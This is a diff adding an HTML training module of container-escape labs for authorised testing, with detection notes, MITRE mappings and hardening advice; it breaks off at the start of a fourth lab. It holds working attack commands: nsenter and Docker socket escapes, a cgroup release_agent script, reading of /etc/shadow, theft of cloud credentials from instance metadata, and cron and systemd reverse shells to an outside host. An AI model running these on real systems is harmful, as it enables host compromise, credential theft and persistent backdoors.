@@ -1,0 +1,965 @@
+<!-- M14: Container Escape & Kubernetes Attacks — Expert Tier Labs -->
+<!-- DISCLAIMER: This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test. -->
+
+<div class="lab-walkthrough-content" id="M14-L01-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Escape from a privileged container to the underlying host using <code>nsenter</code> to break into PID 1's namespaces, gaining full host access.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Access to a Kubernetes pod running with <code>securityContext.privileged: true</code> and <code>hostPID: true</code></li>
+      <li>Basic understanding of Linux namespaces and capabilities</li>
+      <li><code>nsenter</code> available inside the container (present in most base images)</li>
+    </ul>
+  </div>
+
+  <div class="warning">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized testing only.</strong> These techniques escape container isolation. Only perform on lab environments or systems where you have explicit written permission.
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Check if the container is running in privileged mode by examining the effective capabilities bitmask. A value of <code>0000003fffffffff</code> means all capabilities are granted. Also verify that <code>CAP_SYS_ADMIN</code> is present before attempting namespace-based escapes — it is required for <code>nsenter</code> and mount operations.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@pod-7f8a9b0c:/# cat /proc/1/status | grep -i cap</div>
+            <div class="terminal-output">CapInh:	0000003fffffffff
+CapPrm:	0000003fffffffff
+CapEff:	0000003fffffffff
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000</div>
+            <div class="terminal-cmd">root@pod-7f8a9b0c:/# # All caps = 0000003fffffffff → PRIVILEGED MODE
+# Verify CAP_SYS_ADMIN specifically (required for nsenter and mount)
+capsh --print | grep sys_admin</div>
+            <div class="terminal-output">Current: = cap_chown,cap_dac_override,cap_dac_read_search,...,cap_sys_admin,...+eip
+Bounding set =...cap_sys_admin...</div>
+            <div class="terminal-cmd">root@pod-7f8a9b0c:/# # CAP_SYS_ADMIN confirmed — nsenter escape is viable</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Check if <code>hostPID</code> is enabled by looking for host processes visible from inside the container. If you can see the host's init system (PID 1 = <code>/sbin/init</code> or <code>systemd</code>), <code>hostPID: true</code> is confirmed.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@pod-7f8a9b0c:/# cat /proc/1/cmdline | tr '\0' ' '</div>
+            <div class="terminal-output">/sbin/init</div>
+            <div class="terminal-cmd">root@pod-7f8a9b0c:/# # PID 1 = /sbin/init → this is the HOST's init, not the container's entrypoint
+# hostPID = true confirmed</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Escape to the host using <code>nsenter</code> to enter PID 1's mount, UTS, IPC, network, and PID namespaces. This drops you into a root shell on the underlying EC2/EKS node. The <code>--target 1</code> references PID 1 on the <em>host</em> — visible because <code>hostPID: true</code> shares the host's PID namespace with the container.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@pod-7f8a9b0c:/# nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash</div>
+            <div class="terminal-output">root@ip-10-0-3-42:/#</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # We are now on the HOST — not in the container
+hostname && uname -r</div>
+            <div class="terminal-output">ip-10-0-3-42.ec2.internal
+5.10.220-209.878.amzn2.x86_64</div>
+          </div>
+        </div>
+        <div class="note"><strong>Note:</strong> On EKS nodes running <code>containerd</code> (the default since EKS 1.24), <code>docker ps</code> is not available. Use <code>crictl</code> instead — see Step 4.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Verify you are on the host. On modern EKS nodes using <code>containerd</code> as the CRI, Docker is not installed — use <code>crictl</code> for container runtime interactions.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# hostname && id</div>
+            <div class="terminal-output">ip-10-0-3-42.ec2.internal
+uid=0(root) gid=0(root) groups=0(root)</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # On containerd nodes (EKS 1.24+), use crictl — NOT docker
+# List running containers
+crictl ps</div>
+            <div class="terminal-output">CONTAINER     IMAGE         CREATED       STATE     NAME        ATTEMPT
+a1b2c3d4e5f6  sha256:abc..  3 hours ago   Running   webapp      0
+b2c3d4e5f6a7  sha256:def..  3 hours ago   Running   api         0
+c3d4e5f6a7b8  sha256:fed..  3 hours ago   Running   redis       0</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # List all images cached on this node
+crictl images</div>
+            <div class="terminal-output">IMAGE                                                    TAG     IMAGE ID        SIZE
+123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp     latest  sha256:abc...   187MB
+123456789012.dkr.ecr.us-east-1.amazonaws.com/api        latest  sha256:def...   203MB
+redis                                                    7-alpine sha256:fed...  43MB</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # Inspect a specific container to see env vars, mounts, etc.
+crictl inspect a1b2c3d4e5f6 | jq '.info.config.envs'</div>
+            <div class="terminal-output">[
+  "AWS_DEFAULT_REGION=us-east-1",
+  "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/a1b2c3d4..."
+]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Read the host filesystem directly from the privileged container via <code>/proc/1/root</code> — a shortcut to the host root filesystem that works even without a full namespace escape. Then pivot to cloud credentials via IMDSv2 (the two-step token flow required on all modern EKS nodes).</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # /proc/1/root gives direct access to the host filesystem
+ls /proc/1/root/etc/ | head -10</div>
+            <div class="terminal-output">amazon
+cron.d
+environment
+hostname
+hosts
+kubernetes
+os-release
+passwd
+resolv.conf
+shadow</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # Read host's /etc/shadow
+cat /proc/1/root/etc/shadow | head -3</div>
+            <div class="terminal-output">root:$6$rounds=5000$SALT$HASH...:19900:0:99999:7:::
+daemon:*:19900:0:99999:7:::
+bin:*:19900:0:99999:7:::</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # Read kubelet service account tokens from all pods on this node
+ls /var/lib/kubelet/pods/ | head -3</div>
+            <div class="terminal-output">1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
+2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e
+3c4d5e6f-7a8b-9c0d-1e2f-3a4b5c6d7e8f</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # IMDSv2 two-step: get token first, then use it (required on EKS nodes)
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+# Step 2: list IAM role name
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/</div>
+            <div class="terminal-output">eks-node-group-role</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # Step 3: retrieve the actual credentials
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-group-role</div>
+            <div class="terminal-output">{
+  "Code": "Success",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIAIOSFODNN7NODEROL",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/NodeRoleSecret",
+  "Token": "FwoGZXIvYXdzEBY...(truncated)",
+  "Expiration": "2026-04-02T22:00:00Z"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">6</div>
+      <div class="step-content">
+        <div class="step-desc">Bonus: ECS task metadata endpoint. If this container runs on ECS (Fargate or EC2 launch type) rather than EKS, AWS credentials are available at the ECS task metadata endpoint using the <code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code> environment variable.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@ecs-task:/# echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</div>
+            <div class="terminal-output">/v2/credentials/a1b2c3d4-e5f6-7890-abcd-ef1234567890</div>
+            <div class="terminal-cmd">root@ecs-task:/# # Fetch ECS task role credentials (169.254.170.2 = ECS task metadata endpoint)
+curl http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}</div>
+            <div class="terminal-output">{
+  "RoleArn": "arn:aws:iam::123456789012:role/ecs-task-role",
+  "AccessKeyId": "ASIAIOSFODNN7ECSTASK",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/EcsTaskSecret",
+  "Token": "FwoGZXIvYXdzEBY...",
+  "Expiration": "2026-04-02T22:00:00Z"
+}</div>
+            <div class="terminal-cmd">root@ecs-task:/# # MITRE T1552.005: Cloud Instance Metadata API
+# ECS metadata endpoint requires no IMDSv2 token — direct HTTP access</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Privileged Pod</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Verify CAP_SYS_ADMIN</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">nsenter PID 1</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Host Shell</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">IMDSv2 Node Creds</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>Alert on pods created with <code>--privileged</code> flag or <code>securityContext.privileged: true</code> in EKS task definitions or pod specs (AWS Security Hub, Falco rule: <code>launch_privileged_container</code>)</li>
+      <li>Monitor for <code>CAP_SYS_ADMIN</code> capability grants in pod security context — this single cap enables most escape techniques</li>
+      <li>Alert on <code>nsenter</code> execution within containers (CloudWatch Container Insights, Falco: <code>nsenter</code> process spawned inside container namespace)</li>
+      <li>Alert on unexpected <code>mount</code> syscalls from container PIDs (seccomp profile violations)</li>
+      <li>CloudTrail: <code>GetCredentials</code> calls to IMDS from an instance that has not previously called it — node role credential theft indicator</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1611</strong> — Escape to Host (privileged container, nsenter)</li>
+      <li><strong>T1613</strong> — Container and Resource Discovery (crictl ps, crictl images, crictl inspect)</li>
+      <li><strong>T1552.005</strong> — Unsecured Credentials: Cloud Instance Metadata API (IMDSv2, ECS task metadata)</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Delete the lab pod: <code>kubectl delete pod &lt;pod-name&gt;</code></li>
+      <li>Rotate any IAM credentials that were accessed from IMDS during the lab</li>
+      <li>Remove any test files written to <code>/proc/1/root</code> or host filesystem paths</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> Never run containers in privileged mode in production. Use <code>securityContext.privileged: false</code>, drop all capabilities, and add back only what is needed. Enforce this with Pod Security Standards (restricted profile). On EKS, enable <code>hostPID: false</code> and use OPA Gatekeeper or Kyverno to block privileged pods at admission.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M14-L02-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Exploit a mounted Docker socket inside a container to spawn a new privileged container with full host filesystem access. Also covers the cgroup v2 release_agent escape as an alternative technique.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Container with <code>/var/run/docker.sock</code> mounted (typically CI/CD runners: Jenkins, GitLab, Drone)</li>
+      <li>Docker client inside the container, or ability to speak the Docker HTTP API via <code>curl</code></li>
+      <li>Understanding of Linux cgroup versions — run <code>stat -fc %T /sys/fs/cgroup/</code> to check</li>
+    </ul>
+  </div>
+
+  <div class="warning">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized testing only.</strong> Docker socket access is equivalent to root on the host. Only perform on authorized lab environments.
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Check if the Docker socket is mounted inside the container. If <code>/var/run/docker.sock</code> exists, you have direct access to the Docker daemon on the host — this is effectively root on the host.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@ci-runner-pod:/# ls -la /var/run/docker.sock</div>
+            <div class="terminal-output">srw-rw---- 1 root docker 0 Apr  1 06:00 /var/run/docker.sock</div>
+            <div class="terminal-cmd">root@ci-runner-pod:/# # Socket exists → full Docker API access → game over</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Use the Docker socket to list all containers running on the host. On EKS/containerd nodes the socket may be absent — in that case the cgroup v2 escape in Step 5 applies instead.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@ci-runner-pod:/# docker ps -a --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"</div>
+            <div class="terminal-output">NAMES                          IMAGE                                              STATUS
+k8s_webapp_webapp-pod          123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp Up 6 hours
+k8s_api_api-pod                123456789012.dkr.ecr.us-east-1.amazonaws.com/api    Up 6 hours
+k8s_ci-runner_ci-runner-pod    jenkins/inbound-agent:latest                        Up 2 hours
+k8s_redis_cache-pod            redis:7-alpine                                      Up 6 hours</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Spawn a new privileged container that mounts the host's root filesystem and shares its PID and network namespaces. Then <code>chroot</code> into the host root.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@ci-runner-pod:/# docker run -it --privileged \
+    --pid=host --net=host \
+    -v /:/host \
+    ubuntu chroot /host bash</div>
+            <div class="terminal-output">root@ip-10-0-3-42:/# # Full host access achieved</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# id && hostname</div>
+            <div class="terminal-output">uid=0(root) gid=0(root) groups=0(root)
+ip-10-0-3-42.ec2.internal</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Access kubelet configuration, other pod secrets, and the host's IAM role credentials via IMDSv2 for cloud-level lateral movement.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# cat /var/lib/kubelet/kubeconfig | grep server</div>
+            <div class="terminal-output">    server: https://ABCDEF1234567890.gr7.us-east-1.eks.amazonaws.com</div>
+            <div class="terminal-cmd">root@ip-10-0-3-42:/# # IMDSv2 — get token first
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/</div>
+            <div class="terminal-output">eks-node-group-role</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Alternative technique: cgroup release_agent escape.</strong> This works on privileged containers even without Docker socket access. First determine which cgroup version is active — the technique differs between v1 and v2.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@privileged-pod:/# # Check cgroup version
+stat -fc %T /sys/fs/cgroup/</div>
+            <div class="terminal-output">tmpfs</div>
+            <div class="terminal-cmd">root@privileged-pod:/# # tmpfs = cgroup v1. If output is cgroup2fs, skip to the v2 note below.
+# cgroup v1 release_agent escape:
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+# Write the payload script to the host path
+echo '#!/bin/sh' > /cmd
+echo "cat /etc/shadow > $host_path/output" >> /cmd
+chmod a+x /cmd
+# Trigger: create a process in the cgroup and let it exit
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+# Wait for the kernel to fire the release_agent
+sleep 1 && cat /output | head -3</div>
+            <div class="terminal-output">root:$6$rounds=5000$SALT$HASH...:19900:0:99999:7:::
+daemon:*:19900:0:99999:7:::
+bin:*:19900:0:99999:7:::</div>
+            <div class="terminal-cmd">root@privileged-pod:/# # HOST's /etc/shadow — we executed as root on the host via cgroup v1</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+        <div class="note"><strong>cgroup v2 note:</strong> On kernels using cgroup v2 (detected by <code>stat -fc %T /sys/fs/cgroup/</code> returning <code>cgroup2fs</code>), the <code>release_agent</code> file does not exist. On v2 hosts, use the eBPF-based escape (requires <code>CAP_BPF</code>) or fall back to the <code>nsenter</code> / <code>/proc/1/root</code> techniques from Lab L01, which work regardless of cgroup version.</div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Docker Socket</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">docker run --privileged</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">chroot /host</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Full Host Root</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>Alert on container startup with <code>/var/run/docker.sock</code> volume mount (ECS task definition scan, Falco rule: <code>launch_sensitive_mount_container</code>)</li>
+      <li>Alert on <code>mount</code> syscalls involving cgroup filesystem types from inside a container</li>
+      <li>Alert on writes to <code>/sys/fs/cgroup/*/release_agent</code> (kernel audit, Falco)</li>
+      <li>Monitor for unexpected <code>docker run</code> or <code>crictl run</code> commands spawned by CI/CD service accounts</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1611</strong> — Escape to Host (Docker socket, cgroup release_agent)</li>
+      <li><strong>T1613</strong> — Container and Resource Discovery (docker ps, crictl ps)</li>
+      <li><strong>T1552.005</strong> — Unsecured Credentials: Cloud Instance Metadata API (IMDSv2)</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Remove escape artifacts: <code>rm -f /cmd /output</code> (from the host filesystem)</li>
+      <li>Unmount cgroup: <code>umount /tmp/cgrp</code> and <code>rmdir /tmp/cgrp/x /tmp/cgrp</code></li>
+      <li>Delete any privileged containers spawned via Docker socket</li>
+      <li>Rotate IMDS-derived IAM credentials if accessed</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> Docker socket mount = root on host. This is the most common container escape vector. Never mount <code>/var/run/docker.sock</code> into application containers. For CI/CD runners, use rootless Docker, Kaniko, or Buildah instead. The cgroup v1 release_agent escape requires a kernel older than the backport patches (most AL2/AL2023 EKS AMIs are patched for v1 but check your AMI version).
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M14-L03-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Escape from a container with a hostPath volume mount by writing persistence mechanisms (crontab, SSH keys, systemd services) to the host filesystem.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Container with a <code>hostPath</code> volume mounting a writable portion of the host filesystem</li>
+      <li>Write access to the mounted host path from within the container</li>
+      <li>Basic understanding of Linux cron, SSH authorized_keys, and systemd service units</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Identify hostPath volume mounts inside the container. Any mount pointing to a host directory gives write access to the host filesystem at that path.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@monitoring-pod:/# mount | grep -E "hostPath|/host"</div>
+            <div class="terminal-output">/dev/nvme0n1p1 on /host-vol type xfs (rw,relatime,attr2,inode64,logbufs=8)
+/dev/nvme0n1p1 on /host-logs type xfs (rw,relatime,attr2,inode64,logbufs=8)</div>
+            <div class="terminal-cmd">root@monitoring-pod:/# ls /host-vol/</div>
+            <div class="terminal-output">bin  boot  dev  etc  home  lib  lib64  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</div>
+            <div class="terminal-cmd">root@monitoring-pod:/# # /host-vol is the HOST's root filesystem!</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Write a cron backdoor to the host filesystem. The host's cron daemon will execute it, giving a reverse shell from the host itself — not from inside the container.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@monitoring-pod:/# echo '*/1 * * * * root bash -c "bash -i >& /dev/tcp/10.0.5.100/4444 0>&1"' \
+    > /host-vol/etc/cron.d/backdoor
+root@monitoring-pod:/# chmod 0644 /host-vol/etc/cron.d/backdoor</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Alternative persistence: write an SSH public key to the host's root authorized_keys for direct SSH access that survives pod deletion.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@monitoring-pod:/# mkdir -p /host-vol/root/.ssh
+root@monitoring-pod:/# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...attacker-key" \
+    >> /host-vol/root/.ssh/authorized_keys
+root@monitoring-pod:/# chmod 700 /host-vol/root/.ssh
+root@monitoring-pod:/# chmod 600 /host-vol/root/.ssh/authorized_keys</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Alternative persistence: write a systemd service that starts on boot and maintains a persistent reverse shell connection.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@monitoring-pod:/# cat > /host-vol/etc/systemd/system/debug-agent.service &lt;&lt;'EOF'
+[Unit]
+Description=Debug Agent Service
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.0.5.100/4444 0>&1; sleep 300; done'
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF</div>
+            <div class="terminal-output"></div>
+            <div class="terminal-cmd">root@monitoring-pod:/# # Enable via symlink (no systemctl inside container)
+ln -sf /etc/systemd/system/debug-agent.service \
+    /host-vol/etc/systemd/system/multi-user.target.wants/debug-agent.service</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Wait for the persistence mechanism to trigger. The cron backdoor fires within 1 minute, giving a host-level reverse shell.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # On attacker machine — wait for callback
+nc -nlvp 4444</div>
+            <div class="terminal-output">Listening on 0.0.0.0 4444
+Connection received on 10.0.3.42 51234
+root@ip-10-0-3-42:/# whoami
+root
+root@ip-10-0-3-42:/# hostname
+ip-10-0-3-42.ec2.internal
+root@ip-10-0-3-42:/# # This shell is on the HOST — not in the container</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Pod with hostPath</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Write /etc/cron.d</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Host cron runs</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Reverse Shell</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>Alert on new files written to <code>/etc/cron.d/</code>, <code>/root/.ssh/authorized_keys</code>, or <code>/etc/systemd/system/</code> from container PIDs (auditd, Falco)</li>
+      <li>Monitor for unexpected processes spawned by <code>cron</code> with network connections to external IPs</li>
+      <li>Restrict hostPath volumes via OPA Gatekeeper or Kyverno — deny mounts of <code>/</code>, <code>/etc</code>, <code>/root</code></li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1611</strong> — Escape to Host (hostPath write)</li>
+      <li><strong>T1053.003</strong> — Scheduled Task/Job: Cron (crontab backdoor)</li>
+      <li><strong>T1098.004</strong> — Account Manipulation: SSH Authorized Keys</li>
+      <li><strong>T1543.002</strong> — Create or Modify System Process: Systemd Service</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Remove cron backdoor: <code>rm /host-vol/etc/cron.d/backdoor</code></li>
+      <li>Remove SSH key: edit <code>/host-vol/root/.ssh/authorized_keys</code> and remove the attacker key</li>
+      <li>Disable and remove systemd service: <code>rm /host-vol/etc/systemd/system/debug-agent.service</code> and the wants symlink</li>
+      <li>Delete the lab pod: <code>kubectl delete pod monitoring-pod</code></li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> Avoid <code>hostPath</code> volumes in production. Use <code>emptyDir</code>, <code>persistentVolumeClaim</code>, or CSI drivers instead. If hostPath is required, set <code>readOnly: true</code> and restrict to specific subdirectories — never mount <code>/</code>.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M14-L04-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Steal Kubernetes service account tokens from within a compromised pod and use them to interact with the Kubernetes API for further enumeration and privilege escalation.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
